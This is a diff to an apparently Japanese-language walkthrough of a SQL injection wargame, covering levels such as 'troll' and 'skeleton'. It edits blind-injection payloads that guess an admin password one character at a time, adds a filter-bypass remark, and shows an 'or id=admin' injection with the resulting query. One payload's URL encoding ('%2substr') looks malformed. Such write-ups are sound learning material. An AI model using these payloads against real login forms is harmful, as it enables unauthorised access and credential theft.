@@ -22,9 +22,9 @@
 ```
 またもや8文字らしい。  
 ```
-?pw='||id='admin'%26%2substr(pw,1,1)='0'#
-?pw='||id='admin'%26%2substr(pw,1,1)='1'#
-?pw='||id='admin'%26%2substr(pw,1,1)='2'#
+?pw='||id='admin'%26%2substr(pw,1,1)='0'%23
+?pw='||id='admin'%26%2substr(pw,1,1)='1'%23
+?pw='||id='admin'%26%2substr(pw,1,1)='2'%23
 :
 ```
 
@@ -36,7 +36,7 @@
 
 ## 08 - troll
 `id='admin'`を取ってきたいが、`admin`の入力が禁止されている。  
-`adm`と`in`を結合することを考えたが、`'`が禁止されているので、結合も難しい。
+`adm`と`in`を結合することを考えたが、`'`や`"`が禁止されているので、結合も難しい。
 
 MySQLはデフォルト設定の場合、文字列比較で大文字小文字を区別しないので、  
 `admin`がダメなら`ADMIN`にしてみる。  
@@ -66,13 +66,3 @@ MySQLはデフォルト設定の場合、文字列比較で大文字小文字を
 ?pw=' or id='admin'%23
 ```
 > query : select id from prob_skeleton where id='guest' and pw='' or id='admin'#' and 1=0
-
-
-
-
-
-
-
-
-
-
